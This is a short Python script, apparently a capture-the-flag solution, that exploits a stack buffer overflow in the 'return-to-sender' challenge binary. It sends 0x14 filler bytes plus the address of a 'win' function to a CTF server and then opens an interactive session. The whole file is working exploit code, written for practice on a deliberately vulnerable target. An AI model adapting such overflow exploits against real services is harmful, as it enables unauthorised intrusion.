from ptrlib import *

elf = ELF("./return-to-sender")
#sock = Process("./return-to-sender")
sock = Socket("pwn.hsctf.com", 1234)

payload = b'A' * 0x14
payload += p32(elf.symbol("win"))
sock.sendline(payload)

sock.interactive()
